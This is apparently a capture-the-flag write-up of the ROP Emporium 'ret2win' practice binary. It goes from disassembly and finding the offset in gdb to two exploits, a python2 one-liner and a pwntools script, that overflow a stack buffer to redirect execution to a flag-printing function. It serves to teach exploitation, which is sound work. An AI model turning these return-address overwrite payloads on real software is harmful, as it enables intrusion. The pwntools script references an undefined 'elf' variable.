# ret2win: No canary, stack NX, ret to function 


https://ropemporium.com/challenge/ret2win.html


## checksec 

```
 checksec ret2win 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/yolo/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.8.0)
[*] '/home/yolo/yolo/BufferOverflows/ropemporium/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found      <-- stack buffer overflow allowed
    NX:       NX enabled           <-- no payload in stack overflow
    PIE:      No PIE (0x400000)    <-- easy function call    
```

## analyse asm with radare2

Start radare2
```
$ r2 ret2win 
[0x004005b0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Finding function preludes
[x] Enable constraint types analysis for variables
```

Get functions list
```
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   entry.fini0
0x00400690    1 7            entry.init0
0x004006e8    1 110          sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400756    1 27           sym.ret2win
0x00400560    1 6            sym.imp.system
0x004007f0    1 2            sym.__libc_csu_fini
0x004007f4    1 9            sym._fini
0x00400780    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

Read functions
```
[0x004005b0]> pdf @ main
            ; DATA XREF from entry0 @ 0x4005cd
┌ 81: int main (int argc, char **argv, char **envp);
│           0x00400697      55             push rbp
│           0x00400698      4889e5         mov rbp, rsp
│           0x0040069b      488b05b60920.  mov rax, qword [obj.stdout] ; rdi
│                                                                      ; [0x601058:8]=0
│           0x004006a2      b900000000     mov ecx, 0                  ; size_t size
│           0x004006a7      ba02000000     mov edx, 2                  ; int mode
│           0x004006ac      be00000000     mov esi, 0                  ; char *buf
│           0x004006b1      4889c7         mov rdi, rax                ; FILE*stream
│           0x004006b4      e8e7feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x004006b9      bf08084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x400808 ; "ret2win by ROP Emporium" ; const char *s
│           0x004006be      e88dfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006c3      bf20084000     mov edi, str.x86_64         ; 0x400820 ; "x86_64\n" ; const char *s
│           0x004006c8      e883feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006cd      b800000000     mov eax, 0
│           0x004006d2      e811000000     call sym.pwnme
│           0x004006d7      bf28084000     mov edi, str.Exiting        ; 0x400828 ; "\nExiting" ; const char *s
│           0x004006dc      e86ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006e1      b800000000     mov eax, 0
│           0x004006e6      5d             pop rbp
└           0x004006e7      c3             ret



[0x004005b0]> pdf @ sym.pwnme
            ; CALL XREF from main @ 0x4006d2
┌ 110: sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x004006e8      55             push rbp
│           0x004006e9      4889e5         mov rbp, rsp
│           0x004006ec      4883ec20       sub rsp, 0x20
│           0x004006f0      488d45e0       lea rax, qword [buf]
│           0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004006f9      be00000000     mov esi, 0                  ; int c
│           0x004006fe      4889c7         mov rdi, rax                ; void *s
│           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)

│           0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer ; 0x400838 ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!" ; const char *s
│           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)

│           0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong ; 0x400898 ; "What could possibly go wrong?" ; const char *s
│           0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)

│           0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_read ; 0x4008b8 ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n" ; const char *s
│           0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)

│           0x00400724      bf18094000     mov edi, 0x400918           ; const char *format
│           0x00400729      b800000000     mov eax, 0
│           0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400733      488d45e0       lea rax, qword [buf]
│           0x00400737      ba38000000     mov edx, 0x38               ; rdx ; size_t nbyte
│           0x0040073c      4889c6         mov rsi, rax                ; void *buf
│           0x0040073f      bf00000000     mov edi, 0                  ; int fildes
│           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)

│           0x00400749      bf1b094000     mov edi, str.Thank_you      ; 0x40091b ; "Thank you!" ; const char *s
│           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400753      90             nop
│           0x00400754      c9             leave
└           0x00400755      c3             ret



[0x004005b0]> pdf @ sym.ret2win
┌ 27: sym.ret2win ();
│           0x00400756      55             push rbp
│           0x00400757      4889e5         mov rbp, rsp
│           0x0040075a      bf26094000     mov edi, str.Well_done__Here_s_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
│           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)

│           0x00400764      bf43094000     mov edi, str.bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
│           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0040076e      90             nop
│           0x0040076f      5d             pop rbp
└           0x00400770      c3             ret
```

Function ret2win launche system("/bin/cat flag.txt")
Let call: 0x00400756, (push, dont work, side effect ?)
or (better:)    0x00400757 or 0x00400764 (both are ok)



## Get buffer size 

```
$ gdb ret2win 
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
 
gdb-peda$ r
Starting program: /home/yolo/yolo/BufferOverflows/ropemporium/01_ret2win/ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RSP: 0x7fffffffdf08 ("AA0AAFAAbAA1AAGA\263")    
RIP: 0x400755 (<pwnme+109>:	ret)
...
[-------------------------------------code-------------------------------------]
   0x40074e <pwnme+102>:	call   0x400550 <puts@plt>
   0x400753 <pwnme+107>:	nop
   0x400754 <pwnme+108>:	leave  
=> 0x400755 <pwnme+109>:	ret    
   0x400756 <ret2win>:	push   rbp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf08 ("AA0AAFAAbAA1AAGA\263")    <==== Ret Address on stack  !!!!!
...
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400755 in pwnme ()
gdb-peda$ 

gdb-peda$ pattern offset AA0AAFAAbAA1AAGA
AA0AAFAAbAA1AAGA found at offset: 40
```

Offset = 40 

## Exploit bash & python2 


```
python2 -c 'print ("\x90"*40 + "\x64\x07\x40\x00\x00\x00\x00\x00\x00")' | ./ret2win
```

## Exploit python3 & pwn


```
#!/usr/bin/python3 

from pwn import *

io = process(elf.path)
ret2win = p64(0x00400757)
payload = b"A"*40 + ret2win

print(io.recvuntil("> ").decode())
io.sendline(payload)
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
```

